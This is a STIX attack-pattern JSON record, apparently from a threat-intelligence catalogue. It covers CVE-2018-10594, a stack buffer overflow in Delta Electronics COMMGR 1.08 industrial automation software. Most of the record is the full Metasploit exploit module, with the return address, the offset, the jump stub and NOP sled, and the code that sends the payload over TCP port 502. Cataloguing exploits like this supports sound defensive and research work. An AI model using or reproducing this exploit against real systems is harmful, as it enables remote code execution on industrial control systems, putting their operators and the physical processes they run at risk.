{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3124b0ab-abef-411b-a58b-cb7aed90480d",
    "created": "2024-08-14T16:39:14.296306Z",
    "modified": "2024-08-14T16:39:14.29631Z",
    "name": "Delta Electronics Delta Industrial Automation COMMGR 1.08 Stack Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Delta Electronics Delta Industrial Automation COMMGR 1.08. The vulnerability exists in COMMGR.exe when handling specially crafted packets. This module has been tested successfully on Delta Electronics Delta Industrial Automation COMMGR 1.08 over Windows XP SP3 Windows 7 SP1, and Windows 8.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/delta_ia_commgr_bof.rb",
            "external_id": "delta_ia_commgr_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10594"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-18-172-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Delta Electronics Delta Industrial Automation COMMGR 1.08 Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow in Delta Electronics Delta Industrial\n        Automation COMMGR 1.08. The vulnerability exists in COMMGR.exe when handling specially\n        crafted packets. This module has been tested successfully on Delta Electronics Delta\n        Industrial Automation COMMGR 1.08 over\n          Windows XP SP3,\n          Windows 7 SP1, and\n          Windows 8.1.\n      },\n      'Author'         =>\n        [\n          'ZDI',        # Initial discovery\n          't4rkd3vilz', # PoC\n          'hubertwslin' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2018-10594' ],\n          [ 'BID', '104529' ],\n          [ 'ZDI', '18-586' ],\n          [ 'ZDI', '18-588' ],\n          [ 'EDB', '44965' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-172-01' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 640,\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\"\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'COMMGR 1.08 / Windows Universal',\n            {\n              'Ret'    => 0x00401e14, # p/p/r COMMGR.exe\n              'Offset' => 4164\n            }\n          ],\n        ],\n      'DisclosureDate' => '2018-07-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(502)\n      ])\n  end\n\n  def exploit\n    data =  rand_text_alpha(target['Offset'])\n    data << \"\\xeb\\x27\\x90\\x90\"    # jmp short $+27 to the NOP sled\n    data << [target.ret].pack(\"V\")\n    data << make_nops(40)\n    data << payload.encoded\n\n    print_status(\"Trying target #{target.name}, sending #{data.length} bytes...\")\n    connect\n    sock.put(data)\n    disconnect\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2018-07-02",
    "x_mitre_platforms": [
        "win'"
    ]
}